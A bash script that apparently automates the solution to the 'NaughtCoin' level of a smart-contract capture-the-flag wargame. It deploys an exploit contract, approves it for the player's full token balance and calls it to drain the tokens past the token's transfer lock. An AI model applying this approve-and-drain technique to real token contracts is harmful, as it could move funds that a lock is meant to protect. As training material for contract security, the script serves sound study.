#!/usr/bin/env bash
set -e

CONTRACT="$1"

[ "$CONTRACT" == "" ] && echo "A contract address must be specified as the first argument" >&2 && exit 1
[ "$ETH_RPC_URL" == "" ] && echo "ETH_RPC_URL not set" >&2 && exit 1
[ "$CHAIN" == "" ] && echo "CHAIN not set" >&2 && exit 1

if [ "$PRIVATE_KEY" == "" ]
then
	echo "Enter private key"
	read -s "PRIVATE_KEY"
fi
PRIVATE_KEY=$(echo $PRIVATE_KEY | sed 's/^0x//')

echo "Deploying exploit"
EXPLOIT_ADDRESS=$(
	forge create \
		--private-key ${PRIVATE_KEY} \
		src/Level15Exploit.sol:NaughtCoinExploit \
	| grep "Deployed to:" \
	| awk '{print $3}' \
	| tr [:upper:] [:lower:])

echo "Exploit address: ${EXPLOIT_ADDRESS}"

echo "Executing exploit"
ATTACKER_ADDRESS=$(cast wallet address --private-key ${PRIVATE_KEY} | tr [:upper:] [:lower:])
BALANCE=$(cast call \
	${CONTRACT} \
	$(cast calldata "balanceOf(address)(uint256)" ${ATTACKER_ADDRESS}))

cast send \
	--private-key ${PRIVATE_KEY} \
	${CONTRACT} \
	$(cast calldata "approve(address,uint256)" ${EXPLOIT_ADDRESS} ${BALANCE})

cast send \
	--private-key ${PRIVATE_KEY} \
	${EXPLOIT_ADDRESS} \
	$(cast calldata "exploit(address)" ${CONTRACT})

NEW_BALANCE=$(cast call \
	${CONTRACT} \
	$(cast calldata "balanceOf(address)(uint256)" ${ATTACKER_ADDRESS}) \
	| cast to-dec)

if [ ${NEW_BALANCE} -eq 0 ]
then
	echo "Level completed, submit instance"
else
	echo "ERROR: Solution failed"
fi
